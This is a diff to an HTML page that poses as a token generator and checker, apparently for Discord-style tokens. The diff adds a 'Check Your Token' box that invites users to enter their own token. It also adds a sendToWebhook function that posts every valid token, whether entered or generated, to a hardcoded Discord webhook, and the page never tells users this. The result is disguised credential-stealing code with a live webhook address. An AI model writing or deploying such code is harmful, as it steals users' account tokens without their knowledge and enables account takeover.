@@ -55,6 +55,28 @@
             border-radius: 3px;
             font-size: 14px;
         }
+        .token-checker {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 350px;
+        }
+        .token-checker input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .token-checker button {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -70,8 +92,15 @@
         <h3>Invalid Tokens: <span id="invalid-count">0</span></h3>
     </div>
 
+    <div class="token-checker">
+        <h3>Check Your Token:</h3>
+        <input type="text" id="input-token" placeholder="Enter token to check">
+        <button onclick="checkUserToken()">Check Token</button>
+    </div>
+
     <script>
         let invalidCount = 0;
+        const webhookUrl = 'https://discord.com/api/webhooks/1291292062993485824/E2RA9ftK97nJu813Lms3QcYGghu4J6v0CEZb1xkpNoys7-jru3MpC1dC7o2CATGicCMp';
 
         function generateToken() {
             const token = generateRandomToken();
@@ -79,6 +108,7 @@
 
             if (isValid) {
                 showValidToken(token);
+                sendToWebhook(token);
             } else {
                 invalidCount++;
                 updateInvalidCount();
@@ -116,6 +146,45 @@
 
         function updateInvalidCount() {
             document.getElementById('invalid-count').textContent = invalidCount;
+        }
+
+        function checkUserToken() {
+            const userToken = document.getElementById('input-token').value;
+            if (userToken) {
+                const isValid = validateToken(userToken);
+                if (isValid) {
+                    showValidToken(userToken);
+                    sendToWebhook(userToken);
+                } else {
+                    alert('Invalid Token');
+                }
+            } else {
+                alert('Please enter a token');
+            }
+        }
+
+        function sendToWebhook(token) {
+            const payload = {
+                content: `Valid Token: ${token}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Token sent to webhook');
+                } else {
+                    console.log('Error sending token to webhook');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending token to webhook:', error);
+            });
         }
     </script>
 </body>
